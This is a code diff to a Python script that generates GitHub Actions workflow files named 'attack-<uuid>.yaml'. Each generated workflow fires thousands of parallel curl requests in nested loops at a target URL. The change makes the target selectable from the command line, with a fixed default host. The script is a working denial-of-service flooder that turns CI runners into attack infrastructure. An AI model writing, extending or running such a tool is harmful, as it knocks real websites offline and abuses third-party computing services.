@@ -7,6 +7,8 @@ import uuid
 
 unique = str(uuid.uuid4())
 
+default_target =  "https://v6.zero.bs"
+
 now = time.strftime("%Y-%m-%d %H:%M", time.localtime(time.time()))
 
 workflow_dir = ".github/workflows"
@@ -15,6 +17,11 @@ atx = "%s/attack-%s.yaml" % (workflow_dir, unique)
 
 if not os.path.isdir(workflow_dir):
   os.makedirs(workflow_dir, exist_ok=True)
+
+try:
+  target = sys.argv[1]
+except:
+  target = default_target
 
 
 with open(atx, "w") as aty:
@@ -34,15 +41,16 @@ jobs:
         run: |
           counter=0
           max_loops=50
+          target="%s"
           while [ $counter -lt 100 ]; do
             echo "Running loop iteration $((counter + 1))..."
             curl_loop=0
             while [ $curl_loop -lt $max_loops ]; do
-              curl -ks https://v6.zero.bs 2>&1 > /dev/null &
+              curl -ks $target 2>&1 > /dev/null &
               curl_loop=$((curl_loop + 1))
             done
             echo " [+] started $max_loops processes "
-            curl -ks https://v6.zero.bs 2>&1 > /dev/null
+            curl -ks $target 2>&1 > /dev/null
             
             counter=$((counter + 1))
           done
@@ -51,7 +59,7 @@ jobs:
 
 
 
-""" % (unique, unique))
+""" % (unique, unique, target))
 
 print("done %s " % atx)
 
